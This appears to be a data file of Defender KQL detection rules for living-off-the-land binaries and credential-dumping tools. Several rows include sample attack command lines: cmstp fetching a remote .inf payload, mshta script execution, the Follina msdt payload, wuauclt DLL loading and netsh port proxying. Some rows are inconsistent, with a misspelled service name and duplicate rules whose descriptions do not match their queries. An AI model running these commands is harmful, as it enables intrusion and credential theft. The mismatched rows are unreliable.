116,net_pid_0004_domain_group,['net command run to list users in domain admins group'],,1,kql,['lolbin'],t1069.002,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine contains '/dom'
  and ProcessCommandLine has 'group'
  and ProcessCommandLine contains 'Domain Admins'
| where ProcessCommandLine !contains '/add'
"
117,net_pid_0020_view,['net CLT view visible computers'],,3,kql,['lolbin'],,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'view'
  and ProcessCommandLine contains '/view'
"
118,net_pid_0016_user_add,['net CLT used to add users on a device'],,3,kql,['lolbin'],t1087.001,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'user'
| where ProcessCommandLine contains 'net user'
  or ProcessCommandLine contains 'net1 user'
| where ProcessCommandLine contains '/add'
"
119,net_pid_0021_view_all,['net CLT view all visible computer shares'],,3,kql,['lolbin'],,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'view'
  and ProcessCommandLine contains '/view'
  and ProcessCommandLine contains '/all'
"
120,net_pid_0008_file_rename,['net command renamed'],,1,kql,['lolbin'],,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessVersionInfoOriginalFileName =~ 'net.exe'
  or ProcessVersionInfoOriginalFileName =~ 'net1.exe'
| where FileName !~ 'net.exe'
  and FileName !~ 'net1.exe'
"
121,net_pid_0022_stop_defender,['net CLT used to stop window defender service'],,3,kql,['lolbin'],t1562.001,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'stop'
  and ProcessCommandLine contains 'WindDefend'
"
122,net_pid_0015_user,"['net CLT used to list users on a device', 'net CLt used to show a users password policy/profile']",,3,kql,['lolbin'],t1087.001,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'user'
| where ProcessCommandLine contains 'net user'
  or ProcessCommandLine contains 'net1 user'
| where ProcessCommandLine !contains '/dom'
  and ProcessCommandLine !contains '/delete'
  and ProcessCommandLine !contains '/add'
"
123,net_pid_0009_localgroup,"['net command run to list localgroups', 'will list users in a localgroup']",,4,kql,['lolbin'],t1069.001,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'localgroup'
"
124,net_pid_0006_group_enterprise_admins,['net command run to list users in enterprise admins group'],,1,kql,['lolbin'],t1069.002,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine contains '/dom'
  and ProcessCommandLine has 'group'
  and ProcessCommandLine contains 'Enterprise Admins'
| where ProcessCommandLine !contains '/add'
"
125,net_pid_0003_group_domain,"['net command run to list groups on a domain', 'will list users in a group if a group name is passed']",,4,kql,['lolbin'],t1069.002,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine contains '/dom'
  and ProcessCommandLine contains 'group'"
126,net_pid_0001_output_redirected_to_file,"['net command run', ""output redirected '>' or '>>' to a file"", 'potential recon exfil']",,4,kql,['lolbin'],,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'net' 
  or ProcessCommandLine has 'net1'
| where ProcessCommandLine contains '/dom'
| where ProcessCommandLine contains '>>'
  or ProcessCommandLine contains '>'
  or ProcessCommandLine contains 'C$'"
127,net_pid_0005_group_domain_admins_add,['net command run to add user to domain admins group'],,1,kql,['lolbin'],t1069.002,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine contains '/dom'
  and ProcessCommandLine has 'group'
  and ProcessCommandLine contains 'Domain Admins'
| where ProcessCommandLine contains '/add'
"
128,net_pid_0011_localgroup_administrators,['net command used to list users in localgroup administrators'],,3,kql,['lolbin'],t1069.001,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'localgroup'
  and ProcessCommandLine has 'administrators'
| where ProcessCommandLine !contains '/add'
"
129,net_pid_0007_domain_group_enterprise_admins_add,['net command run to add users in enterprise admins group'],,1,kql,['lolbin'],t1069.002,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine contains '/dom'
  and ProcessCommandLine has 'group'
  and ProcessCommandLine contains 'Enterprise Admins'
| where ProcessCommandLine contains '/add'
"
130,net_pid_0011_localgroup_administrators,['net command used to list users in localgroup administrators'],,3,kql,['lolbin'],t1069.001,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'localgroup'
  and ProcessCommandLine has 'administrators'
| where ProcessCommandLine contains '/add'
"
131,net_pid_0014_localgroup_rdp_add,['net command used to add users in localgroup remote desktop users'],,3,kql,['lolbin'],t1069.001,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'localgroup'
| where ProcessCommandLine has 'Remote' 
  and ProcessCommandLine has 'Desktop'
  and ProcessCommandLine has 'Users'
| where ProcessCommandLine contains '/add'
"
132,net_pid_0017_user_domain_add,['net CLT used to add user to a domain'],,1,kql,['lolbin'],,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'user'
| where ProcessCommandLine contains 'net user'
  or ProcessCommandLine contains 'net1 user'
| where ProcessCommandLine contains '/add'
  and ProcessCommandLine contains '/dom'
"
133,net_pid_0002_created_modified_file,"['net command run', ""output redirected '>' or '>>' to a file"", 'potential recon exfil']",,3,kql,['lolbin'],,s0039,,,windows_os,"['file_create', 'file_rename', 'file_modify', 'file_delete']",m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceFileEvents,"| where InitiatingProcessFileName =~'net.exe'
  or InitiatingProcessFileName =~ 'net1.exe'
| where isnotempty(InitiatingProcessCommandLine)
  and FileName !endswith '.exe'
  and isnotnull(FileSize)"
134,net_pid_0013_localgroup_rdp,['net command used to list users in localgroup remote desktop users'],,3,kql,['lolbin'],t1069.001,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'localgroup'
| where ProcessCommandLine has 'Remote' 
  and ProcessCommandLine has 'Desktop'
  and ProcessCommandLine has 'Users'
| where ProcessCommandLine !contains '/add'
"
135,net_pid_0019_user_passwordchg,"['net CLT used to add user to a domain', 'password set to not expire']",,3,kql,['lolbin'],,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'user'
| where ProcessCommandLine contains 'net user'
  or ProcessCommandLine contains 'net1 user'
| where ProcessCommandLine contains '/passwordchg'
"
136,net_pid_0018_user_password_never_expire,"['net CLT used to add user to a domain', 'password set to not expire']",,3,kql,['lolbin'],,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'user'
| where ProcessCommandLine contains 'net user'
  or ProcessCommandLine contains 'net1 user'
| where ProcessCommandLine contains '/expires'
  and ProcessCommandLine contains 'never'
"
137,cmstp_pid_0003_executing_inf_file_all_profiles_flag,['installs a specially formatted .inf with all profiles flag set'],,2,kql,['lolbin'],t1218.003,,,['cmstp.exe /s path\\to\\some_file.inf /au'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'cmstp'
  or ProcessVersionInfoOriginalFileName has 'cmstp'
| where ProcessCommandLine contains '.inf'
  and ProcessCommandLine contains '/au'"
138,cmstp_pid_0005_spawning_child_process,['rare activity of cmstp.exe spawning a child process'],,2,kql,['lolbin'],t1218.003,,,[None],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where InitiatingProcessFileName =~ 'cmstp.exe'
  or InitiatingProcessVersionInfoOriginalFileName =~ 'cmstp.exe'"
139,cmstp_pid_0006_rare_folder_path,"[""rare activity of cmstp.exe being called from any folder that isn't system32""]",,3,kql,['lolbin'],t1036,,,[None],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'cmstp'
  or ProcessVersionInfoOriginalFileName has 'cmstp'
| where FolderPath !contains @'c:\windows\system32\'"
140,cmstp_pid_0002_executing_inf_file_silent_flag,['installs a specially formatted .inf with silent flag set'],,2,kql,['lolbin'],t1218.003,,,"['cmstp.exe /s path\\to\\some_file.inf /au', 'cmstp.exe /s path\\to\\some_file.inf', 'cmstp.exe /ni /s c:\\cmstp\\CorpVPN.inf', 'cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'cmstp'
  or ProcessVersionInfoOriginalFileName has 'cmstp'
| where ProcessCommandLine contains '.inf'
  and ProcessCommandLine contains '/s'"
141,cmstp_pid_0004_executing_inf_file_single_suer_flag,['installs a specially formatted .inf with single user flag'],,2,kql,['lolbin'],t1218.003,,,['cmstp.exe /s path\\to\\some_file.inf /su'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'cmstp'
  or ProcessVersionInfoOriginalFileName has 'cmstp'
| where ProcessCommandLine contains '.inf'
  and ProcessCommandLine contains '/su'"
142,cmstp_pid_0001_executing_inf_file,['installs a specially formatted .inf'],,2,kql,['lolbin'],t1218.003,,,"['cmstp.exe /s path\\to\\some_file.inf /au', 'cmstp.exe /s path\\to\\some_file.inf', 'cmstp.exe /ni /s c:\\cmstp\\CorpVPN.inf', 'cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'cmstp'
  or ProcessVersionInfoOriginalFileName has 'cmstp'
| where ProcessCommandLine contains '.inf'"
143,nltest_pid_0001_dclist,"['nltest running dclist command flag', 'This command first queries Active Directory for a list of DCs', 'List all DCs in the domain']",,2,kql,['lolbin'],t1018,s0359,,['nltest.exe /dclist:#{target_domain}'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'nltest'
  and ProcessCommandLine contains '/dclist'"
144,nltest_pid_0004_dsgetdc,"['nltest running /dsgetdc command flag', 'List Domain Controllers and Info']",,2,kql,['lolbin'],t1018,s0359,,['nltest /dsgetdc:<domain.com>'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'nltest'
  and ProcessCommandLine contains '/dsgetdc'"
145,nltest_pid_0003_trusted_domains,"['nltest running /trusted_domains command flag', 'Returns a list of trusted domains']",,2,kql,['lolbin'],t1482,s0359,,['nltest /trusted_domains'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'nltest'
  and ProcessCommandLine contains '/trusted_domains'"
146,nltest_pid_0002_domain_trust,"['nltest running /domain_trust command flag', 'Returns a list of trusted domains']",,2,kql,['lolbin'],t1482,s0359,,['nltest /domain_trusts'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'nltest'
  and ProcessCommandLine contains '/domain_trusts'"
147,gsecdump_pid_0002_file_indicator,['Dump Creds from memory'],,1,kql,,t1003,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceFileEvents,"| where FileName has 'gsecdump'
  or FileName startswith 'g64-'
  or InitiatingProcessFileName has 'gsecdump'"
148,gsecdump_pid_0001_dump_memory,['Dump Creds from memory'],,1,kql,,t1003,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'gsecdump'
  or FileName has 'gsecdump'"
149,pypykatz_pid_0006_live_lsassdump,"['pypykatz live smb command', 'Dumps and parses the LSASS remotely over SMB', ""Connection is set up using the current user's context."", 'LSASS dump file will be deleted after command finishes (best effort)']",,2,kql,['python'],"['t1003.001', 't1021.002']",,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'live'
  and ProcessCommandLine has 'smb'
  and ProcessCommandLine has 'lsassdump'"
150,pypykatz_pid_0006_live_lsassdump,"['pypykatz live smb command', 'Enumerates shares, folders, files on the target(s) over SMB.']",,2,kql,['python'],"['t1135', 't1021.002']",,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'live'
  and ProcessCommandLine has 'smb'
  and ProcessCommandLine has 'lsassdump'"
151,pypykatz_pid_0010_commandline_indicator,['pypykatz indicator in the commandline'],,2,kql,['python'],,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'pypykatz'
  or InitiatingProcessCommandLine has 'pypykatz'"
152,pypykatz_pid_0002_live_lsa_write_outfile,"['pypykatz lsass dump commands', 'Obtains the credentials stored in the LSASS.exe process.']",,2,kql,['python'],t1003.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'live'
| where ProcessCommandLine contains 'live lsa'
  or (ProcessCommandLine has 'live' and ProcessCommandLine has 'lsa')
| where ProcessCommandLine contains '-o'
  or ProcessCommandLine contains '--json'"
153,pypykatz_pid_0003_live_registry,"['pypykatz dump sam or secrets files', 'Obtains the credentials / secrets / other info from live registry']",,2,kql,['python'],t1003.002,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'live'
| where ProcessCommandLine contains 'live registry'"
154,pypykatz_pid_0001_live_lsa,"['pypykatz lsass dump commands', 'Obtains the credentials stored in the LSASS.exe process.']",,2,kql,['python'],t1003.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'live'
| where ProcessCommandLine contains 'live lsa'
  or (ProcessCommandLine has 'live' and ProcessCommandLine has 'lsa')"
155,pypykatz_pid_0005_live_dcsync,"['pypykatz dcsynce attack', 'Performs DCSYNC attack, extracts all hashes and kerberos keys from the domain controller using DRSUAPI']",,2,kql,['python'],"['t1003.006', 't1021.002']",,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'live'
  and ProcessCommandLine has 'smb'
  and ProcessCommandLine has 'dcsync'"
156,pypykatz_pid_0006_live_regdump,"['pypykatz live smb command', 'Dumps and parses the registry remotely over SMB.', ""Connection is set up using the current user's context."", 'registry hive files will be deleted after command finishes (best effort)']",,2,kql,['python'],"['t1003.002', 't1021.002']",,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'live'
  and ProcessCommandLine has 'smb'
  and ProcessCommandLine has 'regdump'"
157,pypykatz_pid_0006_live_secretsdump,"['pypykatz live smb command', 'performs lsassdump, regdump and dcsync']",,2,kql,['python'],"['t1003', 't1021.002']",,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'live'
  and ProcessCommandLine has 'smb'
  and ProcessCommandLine has 'secretsdump'"
158,pypykatz_pid_0004_live_registry_write_outfile,"['pypykatz dump sam or secrets files', 'Obtains the credentials / secrets / other info from live registry']",,2,kql,['python'],t1003.002,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'live'
| where ProcessCommandLine contains 'live registry'
| where ProcessCommandLine contains '--json'
  or ProcessCommandLine contains '-o'"
159,mshta_pid_0010_rare_file_execution,['mshta executing a rare file extension'],,2,kql,['lolbin'],t1218.005,,,[None],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'mshta'
  or ProcessVersionInfoOriginalFileName has 'mshta'
| where ProcessCommandLine contains '.doc'
  or ProcessCommandLine contains '.xls'
  or ProcessCommandLine contains '.lnk'
  or ProcessCommandLine contains '.png'
  or ProcessCommandLine contains '.zip'
  or ProcessCommandLine contains '.jpg'
  or ProcessCommandLine contains '.bat'
"
160,mshta_pid_0002_executing_vbs,['mshta executing VBS files'],,3,kql,['lolbin'],t1218.005,,,"['mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file <filepath>"""":close"")']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'mshta'
  and ProcessCommandLine has 'vbscript'
  and ProcessCommandLine has 'execute'
| where ProcessCommandLine contains 'script'
  or ProcessCommandLine contains 'run'
  or ProcessCommandLine contains 'wscript'"
161,mshta_pid_0008_rare_process_spawn,"['mshta spawning a rare process', 'maybe result of suspicious HTA']",,2,kql,['lolbin'],t1218.005,,,[None],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where InitiatingProcessFileName has 'mshta'
  or InitiatingProcessVersionInfoOriginalFileName has 'mshta'
| where FileName has 'cscript'
  or FileName has 'wscript'
  or FileName has 'powershell'
  or FileName has 'pwsh'
  or FileName contains 'regsvr'
  or FileName has 'reg'
  or FileName has 'bitsadmin'
"
162,mshta_pid_0004_executing_remote_file,['mshta executing remote file'],,2,kql,['lolbin'],t1218.005,,,['mshta (http:// or https://) filename.hta'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'mshta'
| where ProcessCommandLine contains 'http:'
  or ProcessCommandLine contains 'https:'
  or ProcessCommandLine contains 'ftp:'"
163,mshta_pid_0006_rare_execution_folder,"['mshta executing a file into or from a rare folder path', 'mshta executing a file into or from a folder path commonly abused by threat actors']",,3,kql,['lolbin'],t1218.005,,,[None],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'mshta'
  or ProcessVersionInfoOriginalFileName has 'mshta'
| where ProcessCommandLine contains @'\AppData\Local\'
  or ProcessCommandLine contains @'\Users\Public\'
  or ProcessCommandLine contains @'\Windows\Temp\'
  or ProcessCommandLine contains @'\ProgramData\'"
164,mshta_pid_0001_executing_hta,['mshta executing HTA files'],,3,kql,['lolbin'],t1218.005,,,['mshta c:\\folderpath\\filename.hta'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'mshta'
  and ProcessCommandLine contains '.hta'"
165,mshta_pid_0007_lethal_hta,['mshta spawned by svchost LethalHTA'],,3,kql,['lolbin'],t1218.005,,,[None],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'mshta'
  or ProcessVersionInfoOriginalFileName has 'mshta'
| where InitiatingProcessFileName has 'svchost'"
166,mshta_pid_0009_rare_shell_spawn,"['mshta spawning cmd shell', 'maybe result of suspicious HTA']",,4,kql,['lolbin'],t1218.005,,,[None],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where InitiatingProcessFileName has 'mshta'
  or InitiatingProcessVersionInfoOriginalFileName has 'mshta'
| where FileName has 'cmd'
"
167,mshta_pid_0003_executing_javascript,['mshta executing javascript files'],,2,kql,['lolbin'],t1218.005,,,"[""mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();""]",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'mshta'
  and ProcessCommandLine has 'javascript'
| where ProcessCommandLine contains 'GetObject'
  and ProcessCommandLine contains 'script'"
168,mshta_pid_0005_rare_parent,['mshta being spawned by a rare initiating/parent file'],,3,kql,['lolbin'],t1218.005,,,[None],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'mshta'
  or ProcessVersionInfoOriginalFileName has 'mshta'
| where InitiatingProcessFileName has 'cmd'
  or InitiatingProcessFileName has 'cscript'
  or InitiatingProcessFileName has 'wscript'
  or InitiatingProcessFileName has 'powershell'
  or InitiatingProcessFileName has 'pwsh'
  or InitiatingProcessFileName contains 'regsvr'
  or InitiatingProcessFileName contains 'rundll'"
169,msdt_pid_0002_fpcwdiag_executing_xml,['MSDT executing a xml file'],,2,kql,['lolbin'],t1218.003,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'msdt'
  and ProcessCommandLine has 'PCWDiagnostic'
  and InitiatingProcessFileName !has 'pcwrun'
| where ProcessCommandLine contains '-af'
  and ProcessCommandLine contains '.xml'"
170,msdt_pid_0001_follina_rec_exploit,['MSDT Follina CVE-2022-30190'],,2,kql,"['lolbin', 'cve-2022-30190']",t1218.003,,,"['msdt /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe""']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'msdt'
  and ProcessCommandLine has 'PCWDiagnostic'
| where ProcessCommandLine contains 'IT_BrowseForFile='
  and ProcessCommandLine contains '../../'"
171,appinstaller_pid_0002_handler_invoked_network_conn.yaml,"['AppInstaller.exe is spawned by the default handler for the URI', 'it attempts to load/install a package from the URL and is saved in INetCache']",,4,kql,['lolbin'],t1105,,,,windows_os,['connection_all'],m365d_agent,m365d_security_center,,,m365d_security_center,device_network_events,,api_advanced_hunting,,,DeviceNetworkEvents,"| where InitiatingProcessFileName contains 'appinstaller'
| where RemoteUrl contains 'https:'
  or RemoteUrl contains 'http:'"
172,appinstaller_pid_0001_load_remote_package,"['AppInstaller.exe is spawned by the default handler for the URI', 'it attempts to load/install a package from the URL and is saved in INetCache']",,3,kql,['lolbin'],t1105,,,['appinstaller_pid_0001_invoke_network_connection.yaml'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'start'
  and ProcessCommandLine has 'appinstaller'
| where ProcessCommandLine contains 'ms-appinstaller'
| where ProcessCommandLine contains 'https:'
  or ProcessCommandLine contains 'http:'"
173,wuauclt_pid_0001_execute_dll,['wuauclt executing dll'],,2,kql,['lolbin'],,,,['wuauclt.exe /UpdateDeploymentProvider [Full_Path_To_DLL] /RunHandlerComServer'],windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'wuauclt'
  and ProcessCommandLine has 'RunHandlerComServer'
  and ProcessCommandLine has 'UpdateDeploymentProvider'
| where ProcessCommandLine contains '.dll'
| where ProcessCommandLine !contains 'UpdateDeploymentProvider.dll' 
  and ProcessCommandLine !contains 'UpdateDeploy.dll' 
  and ProcessCommandLine !contains 'wuaueng.dll'"
174,netsh_pid_0012_port_proxy,['netsh used to set up port forwarding port porxy'],,2,kql,['lolbin'],t1090.001,s0108,,['netsh interface portproxy add v4tov4 listenport=8001 listenaddress=<JUMP BOX IP> connectport=3389 connectaddress=<DESTINATION IP>'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'portproxy'
  and ProcessCommandLine has 'add'
  and ProcessCommandLine contains 'v4tov4'"
175,netsh_pid_0004_mod_firewall_rdp_enable,['netsh enables remote desktop feature on windows by modifying firewall rules'],,2,kql,['lolbin'],t1562.004,s0108,,"['netsh.exe advfirewall firewall set rule ""group=remote desktop"" new enable=Yes']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'advfirewall'
  and ProcessCommandLine has 'set'
  and ProcessCommandLine has 'rule'
| where ProcessCommandLine contains 'group='
  and ProcessCommandLine contains 'remote desktop'
  and ProcessCommandLine contains 'enable='
  and ProcessCommandLine contains 'yes'"
176,netsh_pid_0006_add_fw_rule,['add a local firewall rule name'],,5,kql,['lolbin'],t1562.004,s0108,,"['netsh.exe advfirewall firewall add rule ""name=allow RemoteDesktop"" dir=in * protocol=TCP localport=<port num> action=allow']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'advfirewall'
  and ProcessCommandLine has 'add'
  and ProcessCommandLine has 'rule'"
177,netsh_pid_0003_file_rename,['netsh renamed'],,3,kql,['lolbin'],t1036.003,s0108,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
  and ProcessVersionInfoOriginalFileName !has 'netsh'
| where isnotempty(ProcessVersionInfoOriginalFileName)"
178,netsh_pid_0011_port_forwarding_rdp,['netsh used to set up port forwarding for rdp'],,2,kql,['lolbin'],t1090,s0108,,['netsh I p a v l=8001 listena=<JUMP BOX IP> connectp=3389 c=<DESTINATION IP>'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'listena'
  and ProcessCommandLine has 'connectp'
| where ProcessCommandLine contains 'c='
  and ProcessCommandLine contains '=3389'
